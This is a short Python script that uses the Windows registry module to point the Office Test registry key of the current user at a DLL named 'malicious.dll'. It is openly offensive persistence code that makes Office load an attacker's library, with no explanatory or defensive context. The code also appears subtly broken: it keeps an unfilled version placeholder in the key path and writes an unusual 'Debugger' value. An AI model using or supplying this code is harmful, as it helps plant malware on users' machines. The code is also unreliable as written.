import winreg

def modify_office_test_key():
    office_test_key = r"Software\Microsoft\Office\{Office version}\Office Test"
    dll_path = r"C:\path\to\malicious.dll"
    
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, office_test_key, 0, winreg.KEY_WRITE) as key:
        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, dll_path)